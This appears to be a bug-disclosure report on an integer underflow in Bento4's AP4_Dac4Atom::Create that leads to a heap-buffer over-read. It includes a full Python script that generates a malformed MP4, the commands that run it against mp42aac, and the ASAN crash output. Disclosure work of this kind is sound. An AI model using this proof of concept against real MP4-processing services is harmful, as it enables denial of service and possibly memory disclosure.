## Bug0: Heap Buffer Overflow via Integer Underflow in AP4_Dac4Atom::Create

In `AP4_Dac4Atom::Create()` in `Ap4Dac4Atom.cpp` at line 49, the expression `payload_size = size - AP4_ATOM_HEADER_SIZE` performs an unchecked unsigned subtraction where `size` is taken directly from the file-supplied `dac4` box size field, causing an integer underflow when `size` is less than 8 that produces an ~4 GB value used to allocate and then over-read a small heap buffer.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUTPUT_FILE = "poc_input.mp4"

def box(box_type, payload):
    size = 8 + len(payload)
    return struct.pack(">I4s", size, box_type) + payload

def fullbox(box_type, version, flags, payload):
    vf = struct.pack(">B", version) + struct.pack(">I", flags & 0x00FFFFFF)[1:]
    return box(box_type, vf + payload)

IDENTITY_MATRIX = struct.pack(
    ">9i",
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000,
)

# Malformed dac4 box: size field = 4 (< AP4_ATOM_HEADER_SIZE=8)
# Parser reads size=4 and type="dac4", then calls Create(4, stream).
# Inside Create(): payload_size = 4 - 8 = 0xFFFFFFF8 (underflow).
dac4_box = struct.pack(">I4s", 4, b"dac4")

audio_entry_fields = (
    b"\x00" * 6 +
    struct.pack(">H", 1) +
    b"\x00" * 8 +
    struct.pack(">H", 2) +
    struct.pack(">H", 16) +
    struct.pack(">H", 0) +
    struct.pack(">H", 0) +
    struct.pack(">I", 44100 << 16)
)
mp4a_box = box(b"mp4a", audio_entry_fields + dac4_box)

stsd_box = fullbox(b"stsd", 0, 0, struct.pack(">I", 1) + mp4a_box)
stts_box = fullbox(b"stts", 0, 0, struct.pack(">I", 0))
stsc_box = fullbox(b"stsc", 0, 0, struct.pack(">I", 0))
stsz_box = fullbox(b"stsz", 0, 0, struct.pack(">II", 0, 0))
stco_box = fullbox(b"stco", 0, 0, struct.pack(">I", 0))
stbl_box = box(b"stbl", stsd_box + stts_box + stsc_box + stsz_box + stco_box)

smhd_box = fullbox(b"smhd", 0, 0, struct.pack(">HH", 0, 0))
url_box  = fullbox(b"url ", 0, 1, b"")
dref_box = fullbox(b"dref", 0, 0, struct.pack(">I", 1) + url_box)
dinf_box = box(b"dinf", dref_box)
minf_box = box(b"minf", smhd_box + dinf_box + stbl_box)

mdhd_box = fullbox(b"mdhd", 0, 0,
    struct.pack(">IIII", 0, 0, 44100, 0) + struct.pack(">HH", 0, 0))
hdlr_box = fullbox(b"hdlr", 0, 0,
    struct.pack(">I", 0) + b"soun" + b"\x00" * 12 + b"\x00")
mdia_box = box(b"mdia", mdhd_box + hdlr_box + minf_box)

tkhd_box = fullbox(b"tkhd", 0, 3,
    struct.pack(">IIIII", 0, 0, 1, 0, 0) +
    b"\x00" * 8 +
    struct.pack(">HH", 0, 0) +
    struct.pack(">H", 0x0100) +
    struct.pack(">H", 0) +
    IDENTITY_MATRIX +
    struct.pack(">II", 0, 0))
trak_box = box(b"trak", tkhd_box + mdia_box)

mvhd_box = fullbox(b"mvhd", 0, 0,
    struct.pack(">IIII", 0, 0, 1000, 0) +
    struct.pack(">I", 0x00010000) +
    struct.pack(">H", 0x0100) +
    b"\x00" * 10 +
    IDENTITY_MATRIX +
    b"\x00" * 24 +
    struct.pack(">I", 2))
moov_box = box(b"moov", mvhd_box + trak_box)
ftyp_box = box(b"ftyp", b"mp42" + struct.pack(">I", 0) + b"mp42" + b"isom")

mp4_data = ftyp_box + moov_box
with open(OUTPUT_FILE, "wb") as f:
    f.write(mp4_data)
print(f"[+] Written {OUTPUT_FILE} ({len(mp4_data)} bytes)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x50200000013c at pc 0x56366f8ef2d0 bp 0x7ffedb392ef0 sp 0x7ffedb392ee0
READ of size 1 at 0x50200000013c thread T0
    #0 0x56366f8ef2cf in AP4_BitReader::ReadBits(unsigned int) (mp42aac+0x93d2cf)
    #1 0x56366fa5f05a in AP4_Dac4Atom::AP4_Dac4Atom(unsigned int, unsigned char const*) (mp42aac+0xaad05a)

### Impact

An attacker who supplies a crafted MP4 file with a `dac4` box whose size field is less than 8 can trigger an integer underflow in `AP4_Dac4Atom::Create`, causing the parser to construct an `AP4_BitReader` over a heap buffer using the wrapped-around size (~4 GB), which then reads beyond the 12-byte allocated region and produces a heap-buffer-overflow. This vulnerability is exploitable through any invocation of `mp42aac` on an untrusted MP4 file, enabling denial of service via process crash and potentially enabling information disclosure or arbitrary code execution depending on heap layout at the time of the out-of-bounds read. No special privileges are required and the attack surface is fully exposed to any user or service that processes attacker-supplied MP4 files with Bento4.
